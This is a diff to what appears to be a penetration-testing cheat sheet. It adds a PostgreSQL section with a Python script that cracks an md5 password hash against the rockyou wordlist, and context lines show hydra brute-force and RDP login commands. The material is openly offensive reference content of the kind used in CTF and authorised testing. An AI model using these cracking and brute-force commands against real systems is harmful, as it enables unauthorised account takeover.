@@ -38,6 +38,7 @@
 * [NFS - 2049](#NFS---2049)
 * [MySQL - 3306](#mysql---3306)
 * [RDP - 3389](#rdp---3389)
+* [PostgreSQL - 5432](#PostgreSQL---5432)
 * [WINRM - 5985 - 5986](#WINRM---5985---5986)
 * [Fuzzing](#Fuzzing)
 * [Password crack](#password-crack)
@@ -382,6 +383,27 @@ xfreerdp /u:Administrator /p:'Password123!' /v:<IP> /dynamic-resolution
 hydra -f -L <USERS_LIST> -P <PASSWORDS_LIST> rdp://<IP> -u -vV
 hydra -f -l admin -p 1q2w3e4r rdp://<IP> -u -vV
 ~~~
+
+# PostgreSQL - 5432
+
+## PostgreSQL Cracking (md5 password + username)
+
+~~~ bash
+import hashlib
+
+target_hash = "md5ae8c67affdb169a42c9631c02fc67ede"
+username = "rubben"
+
+with open("/usr/share/wordlists/rockyou.txt", "r", encoding="latin-1") as f:
+    for line in f:
+        password = line.strip()
+        combo = password + username
+        hashed = "md5" + hashlib.md5(combo.encode()).hexdigest()
+        if hashed == target_hash:
+            print(f"[+] Password found: {password}")
+            break
+~~~
+
 
 # WINRM - 5985 - 5986
 
